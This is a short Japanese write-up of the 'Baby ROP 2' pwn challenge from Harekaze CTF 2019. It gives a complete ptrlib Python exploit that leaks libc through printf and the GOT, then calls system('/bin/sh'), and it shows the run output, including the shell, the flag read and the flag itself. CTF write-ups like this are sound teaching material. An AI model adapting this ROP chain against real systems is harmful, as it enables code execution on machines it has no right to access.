# [pwn 200pts] Baby ROP 2 - Harekaze CTF 2019
64ビットで基本無効です。
```
$ checksec -f babyrop2
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   71 Symbols     No	0		4	babyrop2
```
基本的にBaby ROPと同じですが、system関数がなくなっています。
解き方はいろいろありますが、今回は1回目にprintfでGOTからlibcのアドレスをリークしてmainに戻り、2回目に`system("/bin/sh")`しました。

```python
from ptrlib import *

libc = ELF("./libc.so.6")
elf = ELF("./babyrop2")
#sock = Process("./babyrop2")
sock = Socket("problem.harekaze.com", 20005)

plt_printf = 0x4004f0
rop_pop_rdi = 0x00400733
rop_pop_rsi_r15 = 0x00400731

payload = b'A' * 0x28
payload += p64(rop_pop_rdi)
payload += p64(elf.got("read"))
payload += p64(plt_printf)
payload += p64(elf.symbol("main"))
sock.recvuntil("name? ")
sock.send(payload)
sock.recvline()
addr = sock.recvuntil("What")[:-4]
libc_base = u64(addr) - libc.symbol("read")

dump("libc base = " + hex(libc_base))

sock.recvuntil("name? ")
sock.send(payload)
payload = b'A' * 0x28
payload += p64(rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(libc_base + libc.symbol("system"))
sock.send(payload)

sock.interactive()
```

```
$ python solve.py 
[+] Socket: Successfully connected to problem.harekaze.com:20005
[ptrlib] libc base = 0x7ff5aedbb000
Welcome to the Pwn World again, AAAAAAAAAAAAAAAAAAAAAAAAAAAAH!
[ptrlib]$ P"ë®õWhat's your name? Welcome to the Pwn World again, AAAAAAAAAAAAAAAAAAAAAAAAAAAA@!
cat /home/babyrop2/flag
HarekazeCTF{u53_b55_53gm3nt_t0_pu7_50m37h1ng}
[ptrlib]$ 
```

# 感想
初心者向けですね。
